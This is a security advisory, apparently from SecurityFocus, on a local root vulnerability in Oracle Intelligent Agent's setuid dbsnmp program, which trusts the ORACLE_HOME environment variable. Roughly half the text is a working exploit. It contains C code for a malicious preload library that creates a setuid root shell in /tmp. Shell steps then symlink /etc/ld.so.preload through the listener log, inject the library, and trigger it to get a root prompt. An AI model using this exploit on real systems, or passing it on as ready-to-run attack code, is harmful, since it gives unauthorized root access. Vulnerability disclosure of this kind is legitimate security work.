source: http://www.securityfocus.com/bid/585/info
 
A vulnerability in the Oracle Intelligent Agent allows local malicious users to execute arbitrary commands and to create world writable files as the root user.
 
The problem lies in the dbsnmp program located in $ORACLE_HOME/bin . This setuid root and setgid dba program trusts the environment variable ORACLE_HOME without verifying its contents. This vulnerability can be exploited in a number of ways.
 
The dbsnmp program calls a tcl script ( nmiconf.tcl ) located by default in $ORACLE_HOME/network/agent/config. A malicious user can craft his own nmiconf.tcl script and fool the dbsnmp program to execute as root.
 
When run without ORACLE_HOME being set, dbsnmp will dump two log files out into the current working directory: dbsnmpc and dbsnmpt . If these files do not exist, dbsnmp will attempt to create them mode 666 and dump around 400 bytes of uncontrollable output into them. If the files do exist, dbsnmp will append these 400 bytes but not change the permissions. Thus a malicious user can create world writable files in the system that do not exist (e.g. /.rhosts).

#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{

  if (!geteuid()) {

  remove("/etc/ld.so.preload");

  execl("/bin/bash","bash","-c","/bin/cp /bin/sh /tmp/xxxx ; /bin/chmod +xs /tmp/xxxx",NULL);

  }

}
*/
$ gcc -o oracle-ex.o -c oracle-ex.c -fPIC
$ gcc  -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 oracle-ex.o -nostartfiles

$  unset ORACLE_HOME

$  umask 0000
$  ln -s /etc/ld.so.preload  /tmp/listener.log
$  /u01/app/oracle/product/8.0.5/bin/tnslsnr

$ echo /tmp/libno_ex.so.1.0 >/etc/ld.so.preload

$ telnet localhost

Trying ...
Connected to localhost.localdomain.
Escape character is '^]'.
Connection closed by foreign host.

$ ./xxxx
#
/*
